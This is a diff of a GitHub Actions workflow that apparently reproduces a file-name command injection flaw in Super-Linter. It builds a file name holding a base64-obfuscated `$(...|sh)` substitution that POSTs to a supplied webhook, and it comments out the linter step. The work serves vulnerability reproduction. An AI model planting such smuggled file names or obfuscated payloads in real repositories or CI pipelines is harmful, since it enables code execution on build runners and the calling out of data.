@@ -21,29 +21,34 @@ jobs:
 
       - name: 1. Generate Malicious Filename (The Exploit)
         run: |
-          # We construct the filename dynamically to simulate a file introduced by a PR.
-          # The payload sends a POST request to the webhook URL.
+          # 1. 定义我们要执行的攻击命令（包含斜杠，不能直接做文件名）
+          ATTACK_CMD="curl -fsS -X POST \"${{ inputs.webhook_url }}\" -d \"vulnerable_version=${{ inputs.target_version }}\""
           
-          WEBHOOK="${{ inputs.webhook_url }}"
+          # 2. 将命令进行 Base64 编码，消除特殊字符和斜杠
+          # -w0 确保不换行
+          ENCODED_CMD=$(echo -n "$ATTACK_CMD" | base64 -w0)
           
-          # Payload: command substitution that curls the webhook
-          # We use a simple 'Ping' instead of exfiltrating secrets for safety during this test.
-          PAYLOAD="pre\$(curl -fsS -X POST \"$WEBHOOK\" -d \"vulnerable_version=${{ inputs.target_version }}\").md"
+          # 3. 构造文件名
+          # 这里的逻辑是：文件名包含 $(echo ... | base64 -d | sh)
+          # 当漏洞触发时，它会解码并执行 sh，从而还原之前的 curl 命令
+          PAYLOAD="pre\$(echo $ENCODED_CMD|base64 -d|sh).md"
           
-          echo "Creating malicious file: $PAYLOAD"
+          echo "Encoded Payload: $PAYLOAD"
+          
+          # 4. 创建文件（现在这是一个合法的文件名了，不含路径分隔符）
           touch "$PAYLOAD"
           
-          # Verify file exists
+          # 验证文件是否创建成功
           ls -la
 
-      - name: 2. Run Super-Linter (Target Version)
-        # We allow this step to fail because the linter might error out, 
-        # but the injection happens during file discovery/initialization.
-        continue-on-error: true 
-        uses: super-linter/super-linter/slim@main # This is a placeholder
-        # dynamic uses is not supported directly in GHA, so we use a different approach below
-        # OR simply ask them to edit the 'uses' line. 
-        # But actually, simpler approach for them:
+      # - name: 2. Run Super-Linter (Target Version)
+      #   # We allow this step to fail because the linter might error out, 
+      #   # but the injection happens during file discovery/initialization.
+      #   continue-on-error: true 
+      #   uses: super-linter/super-linter/slim@main # This is a placeholder
+      #   # dynamic uses is not supported directly in GHA, so we use a different approach below
+      #   # OR simply ask them to edit the 'uses' line. 
+      #   # But actually, simpler approach for them:
         
       # Since we can't dynamically variable-ize the 'uses' clause in GitHub Actions easily,
       # strict reproduction usually asks them to hardcode the version, OR we use docker run manually.
